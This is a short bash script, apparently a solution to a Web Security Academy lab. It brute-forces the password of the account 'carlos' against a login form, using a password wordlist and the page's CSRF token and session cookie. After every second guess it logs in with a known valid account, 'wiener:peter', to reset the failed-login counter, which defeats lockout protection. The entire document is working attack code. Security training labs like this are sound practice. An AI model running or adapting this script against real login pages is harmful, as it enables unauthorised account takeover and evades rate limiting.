#!/bin/bash

URL='https://acdc1fe11eb6d006807363a8001d00fb.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
USER="carlos"
USER0="wiener"
PASS0="peter"
N=1
for PASS in `cat password.txt`;do

    if [ $[ $N % 2 ] == 0 ]
    then
        #Nos logeamos con la cuenta existente
        #Para reiniciar el contador. :D
        DATA2='csrf='$CSRF'&username='$USER0'&password='$PASS0
        curl $URL -d $DATA2 -b $COOKIE -s > $NULL
    fi
    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

    if echo $RESULT | grep -o "Incorrect password" > $NULL
    then
        echo "Incorrect creds: $USER:$PASS"
    else
        echo "Valid creds: $USER:$PASS"
        break
    fi
    N="$[ $N + 1 ]"
done
